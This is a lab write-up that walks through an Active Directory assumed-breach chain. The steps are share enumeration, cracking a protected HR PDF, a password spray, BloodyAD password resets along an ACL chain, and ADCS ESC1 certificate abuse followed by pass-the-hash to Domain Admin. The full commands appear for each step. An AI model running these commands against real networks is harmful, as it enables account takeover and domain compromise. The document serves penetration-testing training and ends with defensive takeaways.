Hack Smarter · Active Directory · Assumed breach. One phished account becomes Domain Admin through a protected document, a password spray, an ACL abuse chain, and a certificate-template flaw.

A Hack Smarter lab, shared with permission. Credentials, hashes, and flag values are redacted — the point is the attack chain, not the answers.

The Setup

You play a red teamer who recovered one set of domain credentials during a phishing engagement. From that single foothold the task is to enumerate the domain, escalate, and demonstrate impact — an “assumed breach” scenario, which is how most real internal tests begin.

A full scan of the DC shows the usual Active Directory surface: DNS, Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985), and an AD Certificate Services CA hinted at by the certificate fields. That CA matters later.

1. Enumerate with the Foothold

With one valid account, NetExec maps the domain quickly: readable shares, the user list, and the password policy.

nxc smb DC -u USER -p PASS --shares
nxc smb DC -u USER -p PASS --users

Alongside the defaults there is a readable Human Resources share and a dozen real users, including a couple of service accounts. A password spray of the one credential we hold hits only itself — no reuse yet — so the share is the next lead.

2. Crack the Protected Document

The HR share holds onboarding PDFs. One is password-protected. Extract its hash and crack it offline.

smbclient //DC/'Human Resources' -U USER%PASS
pdf2john 'Welcome Start Guide.pdf' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Inside the opened document is a default onboarding password — exactly the kind of “new starters all get this” secret that should have been rotated.

3. Spray and Land a User

Spray the onboarding password across the whole user list. One account still uses it.

nxc smb DC -u users.txt -p 'OnboardingPassword' --continue-on-success
# [+] one hit
evil-winrm -i DC -u a.harris -p 'OnboardingPassword'   # user.txt

That account is in the Remote Management group, so WinRM gives an interactive shell and the user flag.

4. Walk the ACL Chain

BloodHound (collected with the current account) shows this account is not an admin — but it holds rights over another user, who in turn holds rights over a service account. That is a privilege chain, and each link is abusable with BloodyAD.

# our user can reset the next user's password
bloodyAD --host DC -d DOMAIN -u a.harris -p 'OnboardingPassword' \
  set password i.park 'NewPass123!'

# that user, in turn, can reset the service account
bloodyAD --host DC -d DOMAIN -u i.park -p 'NewPass123!' \
  set password svc_ca 'NewPass123!'

Forced password resets are loud but effective. We now control svc_ca — a name that strongly suggests a role in the certificate service.

5. ADCS ESC1 to Domain Admin

The service account can enrol in a certificate template that allows the requester to specify any identity (the classic ESC1 misconfiguration). Request a certificate as the administrator, then use it to authenticate and recover the administrator's hash.

certipy req -u svc_ca -p PASS -ca 'DOMAIN-CA' \
  -template 'Welcome-Template' -upn 'administrator@DOMAIN' \
  -dc-ip DC-IP -target DC

certipy auth -pfx administrator.pfx -dc-ip DC-IP   # returns the NT hash

With the administrator's NT hash, pass-the-hash straight to a privileged shell. No password cracking required.

evil-winrm -i DC -u Administrator -H NTHASH   # root.txt

Tip: pass only the 32-character NT hash to evil-winrm -H. Feeding it the full LM:NT string triggers an “invalid hash format” error.

What To Take Away

  • Default onboarding passwords in HR documents are a gift. Rotate them and don't store them on open shares.
  • One recovered password is worth spraying across every account before anything else.
  • BloodHound turns scattered ACLs into a visible path. Chase who-can-reset-whom.
  • A certificate template that lets the requester set the identity (ESC1) is a direct line to Domain Admin. Audit ADCS.
